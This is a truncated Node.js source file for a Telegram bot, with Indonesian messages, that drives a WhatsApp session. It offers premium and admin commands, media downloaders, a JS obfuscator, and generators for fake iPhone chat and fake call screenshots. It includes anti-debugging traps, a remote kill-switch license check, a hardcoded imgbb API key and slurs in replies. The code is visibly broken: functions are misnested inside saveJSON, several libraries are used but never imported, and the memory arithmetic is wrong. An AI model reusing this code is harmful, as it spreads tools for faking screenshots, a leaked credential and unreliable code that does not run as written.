const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const { tokenBot, ownerID } = require("./settings/config");
const config = { OWNER_ID: ownerID, tokenBot }; // ✅ tambahin ini
const adminFile = './database/adminuser.json';
const FormData = require("form-data");
const https = require("https");
function fetchJsonHttps(url, timeout = 5000) {
  return new Promise((resolve, reject) => {
    try {
      const req = https.get(url, { timeout }, (res) => {
        const { statusCode } = res;
        if (statusCode < 200 || statusCode >= 300) {
          let _ = '';
          res.on('data', c => _ += c);
          res.on('end', () => reject(new Error(`HTTP ${statusCode}`)));
          return;
        }
        let raw = '';
        res.on('data', (chunk) => (raw += chunk));
        res.on('end', () => {
          try {
            const json = JSON.parse(raw);
            resolve(json);
          } catch (err) {
            reject(new Error('Invalid JSON response'));
          }
        });
      });
      req.on('timeout', () => {
        req.destroy(new Error('Request timeout'));
      });
      req.on('error', (err) => reject(err));
    } catch (err) {
      reject(err);
    }
  });
}
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  encodeSignedDeviceIdentity,
  encodeWAMessage,
  jidEncode,
  patchMessageBeforeSending,
  encodeNewsletterMessage,
  BufferJSON,
  DisconnectReason,
  proto,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 50) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const databaseUrl = 'https://raw.githubusercontent.com/anything-101/V2020/main/tokens.json';
const thumbnailUrl = "https://files.catbox.moe/kekyp3.jpg";

const thumbnailVideo = "https://files.catbox.moe/kekyp3.jpg";

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.yellow(`
⠀⬡═—⊱ CHECKING SERVER ⊰—═⬡
┃Bot Sukses Terhubung Terimakasih 
⬡═―—―――――――――――――――――—═⬡
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.yellow(`
⠀⬡═—⊱ BYPASS CHECKING ⊰—═⬡
┃PERUBAHAN CODE MYSQL TERDETEKSI
┃ SCRIPT DIMATIKAN / TIDAK BISA PAKAI
⬡═―—―――――――――――――――――—═⬡
  `))
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.yellow(`
⠀⬡═—⊱ BYPASS CHECKING ⊰—═⬡
┃PERUBAHAN CODE MYSQL TERDETEKSI
┃ SCRIPT DIMATIKAN / TIDAK BISA PAKAI
⬡═―—―――――――――――――――――—═⬡
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      activateSecureMode();
      hardExit(1);
    }
  }, 2000);

  global.validateToken = async (databaseUrl, tokenBot) => {
  try {
    const res = await fetchJsonHttps(databaseUrl, 5000);
    const tokens = (res && res.tokens) || [];

    if (!tokens.includes(tokenBot)) {
      console.log(chalk.bold.yellow(`
⠀⬡═—⊱ BYPASS ALERT⊰—═⬡
┃ NOTE : SERVER MENDETEKSI KAMU
┃  MEMBYPASS PAKSA SCRIPT !
⬡═―—―――――――――――――――――—═⬡
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
      hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.yellow(`
⠀⬡═—⊱ CHECK SERVER ⊰—═⬡
┃ DATABASE : MYSQL
┃ NOTE : SERVER GAGAL TERHUBUNG
⬡═―—―――――――――――――――――—═⬡
  `));
    activateSecureMode();
    hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await fetchJsonHttps(databaseUrl, 5000);
        const authorizedTokens = (res && res.tokens) || [];
        return Array.isArray(authorizedTokens) && authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();

const bot = new Telegraf(tokenBot);
let tokenValidated = false;
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addpremUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 524 / 524;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`
⬡═—⊱ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⊰—═⬡
┃ STATUS BOT : CONNECTED
⬡═―—―――――――――――――――――—═⬡
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '5.15.7'],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡</code></pre>
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected
╘—————————————————═⬡`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
⠀⠀⠀
░


  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 500

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

bot.command("addbot", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /addbot 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "1234KYAZ");
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `\`\`\`
⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Number: ${phoneNumber}
⌑ Pairing Code: ${formattedCode}
⌑ Type: Not Connected
╘═——————————————═⬡
\`\`\``;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "Markdown"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `\`\`\`
 ⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected
╘═——————————————═⬡\`\`\`
`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "Markdown" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
    
    
let adminUsers = loadJSON(adminFile);

const checkAdmin = (ctx, next) => {
    if (!adminUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan Admin. jika anda adalah owner silahkan daftar ulang ID anda menjadi admin");
    }
    next();
};


};
// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
    if (!adminList.includes(userId)) {
        adminList.push(userId);
        saveAdmins();
    }
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
    adminList = adminList.filter(id => id !== userId);
    saveAdmins();
};

// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveAdmins = () => {
    fs.writeFileSync('./database/admins.json', JSON.stringify(adminList));
};

// --- Fungsi untuk Memuat Daftar Admin ---
const loadAdmins = () => {
    try {
        const data = fs.readFileSync('./database/admins.json');
        adminList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar admin:'), error);
        adminList = [];
    }
};

bot.command('addadmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(' ');
    const userId = args[1];

    if (adminUsers.includes(userId)) {
        return ctx.reply(`✅ si ngentot ${userId} sudah memiliki status Admin.`);
    }

    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);

    return ctx.reply(`🎉 si kontol ${userId} sekarang memiliki akses Admin!`);
});


bot.command("tiktok", async (ctx) => {
  const args = ctx.message.text.split(" ")[1];
  if (!args)
    return ctx.replyWithMarkdown(
      "🎵 *Download TikTok*\n\nContoh: `/tiktok https://vt.tiktok.com/xxx`\n_Support tanpa watermark & audio_"
    );

  if (!args.match(/(tiktok\.com|vm\.tiktok\.com|vt\.tiktok\.com)/i))
    return ctx.reply("❌ Format link TikTok tidak valid!");

  try {
    const processing = await ctx.reply("⏳ _Mengunduh video TikTok..._", { parse_mode: "Markdown" });

    const encodedParams = new URLSearchParams();
    encodedParams.set("url", args);
    encodedParams.set("hd", "1");

    const { data } = await axios.post("https://tikwm.com/api/", encodedParams, {
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "TikTokBot/1.0",
      },
      timeout: 30000,
    });

    if (!data.data?.play) throw new Error("URL video tidak ditemukan");

    await ctx.deleteMessage(processing.message_id);
    await ctx.replyWithVideo({ url: data.data.play }, {
      caption: `🎵 *${data.data.title || "Video TikTok"}*\n🔗 ${args}\n\n✅ Tanpa watermark`,
      parse_mode: "Markdown",
    });

    if (data.data.music) {
      await ctx.replyWithAudio({ url: data.data.music }, { title: "Audio Original" });
    }
  } catch (err) {
    console.error("[TIKTOK ERROR]", err.message);
    ctx.reply(`❌ Gagal mengunduh: ${err.message}`);
  }
});

// Logging (biar gampang trace error)
function log(message, error) {
  if (error) {
    console.error(`[EncryptBot] ❌ ${message}`, error);
  } else {
    console.log(`[EncryptBot] ✅ ${message}`);
  }
}

bot.command("iqc", async (ctx) => {
  const fullText = (ctx.message.text || "").split(" ").slice(1).join(" ").trim();

  try {
    await ctx.sendChatAction("upload_photo");

    if (!fullText) {
      return ctx.reply(
        "🧩 Masukkan teks!\nContoh: /iqc Konichiwa|06:00|100"
      );
    }

    const parts = fullText.split("|");
    if (parts.length < 2) {
      return ctx.reply(
        "❗ Format salah!\n🍀 Contoh: /iqc Teks|WaktuChat|StatusBar"
      );
    }

    let [message, chatTime, statusBarTime] = parts.map((p) => p.trim());

    if (!statusBarTime) {
      const now = new Date();
      statusBarTime = `${String(now.getHours()).padStart(2, "0")}:${String(
        now.getMinutes()
      ).padStart(2, "0")}`;
    }

    if (message.length > 80) {
      return ctx.reply("🍂 Teks terlalu panjang! Maksimal 80 karakter.");
    }

    const url = `https://api.zenzxz.my.id/maker/fakechatiphone?text=${encodeURIComponent(
      message
    )}&chatime=${encodeURIComponent(chatTime)}&statusbartime=${encodeURIComponent(
      statusBarTime
    )}`;

    const response = await fetch(url);
    if (!response.ok) throw new Error("Gagal mengambil gambar dari API");

    const buffer = await response.buffer();

    const caption = `
✨ <b>Fake Chat iPhone Berhasil Dibuat!</b>

💬 <b>Pesan:</b> ${message}
⏰ <b>Waktu Chat:</b> ${chatTime}
📱 <b>Status Bar:</b> ${statusBarTime}
`;

    await ctx.replyWithPhoto({ source: buffer }, { caption, parse_mode: "HTML" });
  } catch (err) {
    console.error(err);
    await ctx.reply("🍂 Gagal membuat gambar. Coba lagi nanti.");
  }
});

//MD MENU
bot.command("fakecall", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").split("|");

  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.photo) {
    return ctx.reply("❌ Reply ke foto untuk dijadikan avatar!");
  }

  const nama = args[0]?.trim();
  const durasi = args[1]?.trim();

  if (!nama || !durasi) {
    return ctx.reply("📌 Format: `/fakecall nama|durasi` (reply foto)", { parse_mode: "Markdown" });
  }

  try {
    const fileId = ctx.message.reply_to_message.photo.pop().file_id;
    const fileLink = await ctx.telegram.getFileLink(fileId);

    const api = `https://api.zenzxz.my.id/maker/fakecall?nama=${encodeURIComponent(
      nama
    )}&durasi=${encodeURIComponent(durasi)}&avatar=${encodeURIComponent(
      fileLink
    )}`;

    const res = await fetch(api);
    const buffer = await res.buffer();

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `📞 Fake Call dari *${nama}* (durasi: ${durasi})`,
      parse_mode: "Markdown",
    });
  } catch (err) {
    console.error(err);
    ctx.reply("⚠️ Gagal membuat fakecall.");
  }
});

bot.command('mediafire', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    if (!args.length) return ctx.reply('Gunakan: /mediafire <url>');

    try {
      const { data } = await axios.get(`https://www.velyn.biz.id/api/downloader/mediafire?url=${encodeURIComponent(args[0])}`);
      const { title, url } = data.data;

      const filePath = `/tmp/${title}`;
      const response = await axios.get(url, { responseType: 'arraybuffer' });
      fs.writeFileSync(filePath, response.data);

      const zip = new AdmZip();
      zip.addLocalFile(filePath);
      const zipPath = filePath + '.zip';
      zip.writeZip(zipPath);

      await ctx.replyWithDocument({ source: zipPath }, {
        filename: path.basename(zipPath),
        caption: '📦 File berhasil di-zip dari MediaFire'
      });

      
      fs.unlinkSync(filePath);
      fs.unlinkSync(zipPath);

    } catch (err) {
      console.error('[MEDIAFIRE ERROR]', err);
      ctx.reply('Terjadi kesalahan saat membuat ZIP.');
    }
  });

bot.command("fixcode", async (ctx) => {
  try {
    const fileMessage = ctx.message.reply_to_message?.document || ctx.message.document;

    if (!fileMessage) {
      return ctx.reply(`📂 Kirim file .js dan reply dengan perintah /fixcode`);
    }

    const fileName = fileMessage.file_name || "unknown.js";
    if (!fileName.endsWith(".js")) {
      return ctx.reply("⚠️ File harus berformat .js bre!");
    }

    const fileUrl = await ctx.telegram.getFileLink(fileMessage.file_id);
    const response = await axios.get(fileUrl.href, { responseType: "arraybuffer" });
    const fileContent = response.data.toString("utf-8");

    await ctx.reply("🤖 Lagi memperbaiki kodenya bre... tunggu bentar!");

    const { data } = await axios.get("https://api.nekolabs.web.id/ai/gpt/4.1", {
      params: {
        text: fileContent,
        systemPrompt: `Kamu adalah seorang programmer ahli JavaScript dan Node.js.
Tugasmu adalah memperbaiki kode yang diberikan agar bisa dijalankan tanpa error, 
namun jangan mengubah struktur, logika, urutan, atau gaya penulisan aslinya.

Fokus pada:
- Menyelesaikan error sintaks (kurung, kurawal, tanda kutip, koma, dll)
- Menjaga fungsi dan struktur kode tetap sama seperti input
- Jangan menghapus komentar, console.log, atau variabel apapun
- Jika ada blok terbuka (seperti if, else, try, atau fungsi), tutup dengan benar
- Jangan ubah nama fungsi, variabel, atau struktur perintah
- Jangan tambahkan penjelasan apapun di luar kode
- Jangan tambahkan markdown javascript Karena file sudah berbentuk file .js
- Hasil akhir harus langsung berupa kode yang siap dijalankan
`,
        sessionId: "neko"
      },
      timeout: 60000,
    });

    if (!data.success || !data.result) {
      return ctx.reply("❌ Gagal memperbaiki kode, coba ulang bre.");
    }

    const fixedCode = data.result;
    const outputPath = `./fixed_${fileName}`;
    fs.writeFileSync(outputPath, fixedCode);

    await ctx.replyWithDocument({ source: outputPath, filename: `fixed_${fileName}` });
  } catch (err) {
    console.error("FixCode Error:", err);
    ctx.reply("⚠️ Terjadi kesalahan waktu memperbaiki kode.");
  }
});

bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("Example\n/brat Reo Del Rey", { parse_mode: "Markdown" });

  try {
    // Kirim emoji reaksi manual
    await ctx.reply("✨ Membuat stiker...");

    const url = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=false`;
    const response = await axios.get(url, { responseType: "arraybuffer" });

    const filePath = path.join(__dirname, "brat.webp");
    fs.writeFileSync(filePath, response.data);

    await ctx.replyWithSticker({ source: filePath });

    // Optional: hapus file setelah kirim
    fs.unlinkSync(filePath);

  } catch (err) {
    console.error("Error brat:", err.message);
    ctx.reply("❌ Gagal membuat stiker brat. Coba lagi nanti.");
  }
});

bot.command("tourl", async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply) return ctx.reply("❗ Reply media (foto/video/audio/dokumen) dengan perintah /tourl");

    let fileId;
    if (reply.photo) {
      fileId = reply.photo[reply.photo.length - 1].file_id;
    } else if (reply.video) {
      fileId = reply.video.file_id;
    } else if (reply.audio) {
      fileId = reply.audio.file_id;
    } else if (reply.document) {
      fileId = reply.document.file_id;
    } else {
      return ctx.reply("❌ Format file tidak didukung. Harap reply foto/video/audio/dokumen.");
    }

    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", buffer, {
      filename: path.basename(fileLink.href),
      contentType: "application/octet-stream",
    });

    const uploadRes = await axios.post("https://catbox.moe/user/api.php", form, {
      headers: form.getHeaders(),
    });

    const url = uploadRes.data;
    ctx.reply(`✅ File berhasil diupload:\n${url}`);
  } catch (err) {
    console.error("❌ Gagal tourl:", err.message);
    ctx.reply("❌ Gagal mengupload file ke URL.");
  }
});

const IMGBB_API_KEY = "76919ab4062bedf067c9cab0351cf632";

bot.command("tourl2", async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply) return ctx.reply("❗ Reply foto dengan /tourl2");

    let fileId;
    if (reply.photo) {
      fileId = reply.photo[reply.photo.length - 1].file_id;
    } else {
      return ctx.reply("❌ i.ibb hanya mendukung foto/gambar.");
    }

    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    const form = new FormData();
    form.append("image", buffer.toString("base64"));

    const uploadRes = await axios.post(
      `https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`,
      form,
      { headers: form.getHeaders() }
    );

    const url = uploadRes.data.data.url;
    ctx.reply(`✅ Foto berhasil diupload:\n${url}`);
  } catch (err) {
    console.error("❌ tourl2 error:", err.message);
    ctx.reply("❌ Gagal mengupload foto ke i.ibb.co");
  }
});

bot.command("zenc", async (ctx) => {
  
  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
    return ctx.replyWithMarkdown("❌ Harus reply ke file .js");
  }

  const file = ctx.message.reply_to_message.document;
  if (!file.file_name.endsWith(".js")) {
    return ctx.replyWithMarkdown("❌ File harus berekstensi .js");
  }

  const encryptedPath = path.join(
    __dirname,
    `invisible-encrypted-${file.file_name}`
  );

  try {
    const progressMessage = await ctx.replyWithMarkdown(
      "```css\n" +
        "🔒 EncryptBot\n" +
        ` ⚙️ Memulai (Invisible) (1%)\n` +
        ` ${createProgressBar(1)}\n` +
        "```\n"
    );

    const fileLink = await ctx.telegram.getFileLink(file.file_id);
    log(`Mengunduh file: ${file.file_name}`);
    await updateProgress(ctx, progressMessage, 10, "Mengunduh");
    const response = await fetch(fileLink);
    let fileContent = await response.text();
    await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

    log(`Memvalidasi kode awal: ${file.file_name}`);
    await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode");
    try {
      new Function(fileContent);
    } catch (syntaxError) {
      throw new Error(`Kode tidak valid: ${syntaxError.message}`);
    }

    log(`Proses obfuscation: ${file.file_name}`);
    await updateProgress(ctx, progressMessage, 40, "Inisialisasi Obfuscation");
    const obfuscated = await JsConfuser.obfuscate(
      fileContent,
      getStrongObfuscationConfig()
    );

    let obfuscatedCode = obfuscated.code || obfuscated;
    if (typeof obfuscatedCode !== "string") {
      throw new Error("Hasil obfuscation bukan string");
    }

    log(`Preview hasil (50 char): ${obfuscatedCode.substring(0, 50)}...`);
    await updateProgress(ctx, progressMessage, 60, "Transformasi Kode");

    log(`Validasi hasil obfuscation`);
    try {
      new Function(obfuscatedCode);
    } catch (postObfuscationError) {
      throw new Error(
        `Hasil obfuscation tidak valid: ${postObfuscationError.message}`
      );
    }

    await updateProgress(ctx, progressMessage, 80, "Finalisasi Enkripsi");
    await fs.writeFile(encryptedPath, obfuscatedCode);

    log(`Mengirim file terenkripsi: ${file.file_name}`);
    await ctx.replyWithDocument(
      { source: encryptedPath, filename: `Invisible-encrypted-${file.file_name}` },
      {
        caption:
          "✅ *ENCRYPT BERHASIL!*\n\n" +
          "📂 File: `" +
          file.file_name +
          "`\n" +
          "🔒 Mode: *Invisible Strong Obfuscation*",
        parse_mode: "Markdown",
      }
    );

    await ctx.deleteMessage(progressMessage.message_id);

    if (await fs.pathExists(encryptedPath)) {
      await fs.unlink(encryptedPath);
      log(`File sementara dihapus: ${encryptedPath}`);
    }
  } catch (error) {
    log("Kesalahan saat zenc", error);
    await ctx.replyWithMarkdown(
      `❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n` +
        "_Coba lagi dengan kode Javascript yang valid!_"
    );
    if (await fs.pathExists(encryptedPath)) {
      await fs.unlink(encryptedPath);
      log(`File sementara dihapus setelah error: ${encryptedPath}`);
    }
  }
});



bot.command("setcd", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("killsesi", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});



const PREM_GROUP_FILE = "./grup.json";

// Auto create file grup.json kalau belum ada
function ensurePremGroupFile() {
  if (!fs.existsSync(PREM_GROUP_FILE)) {
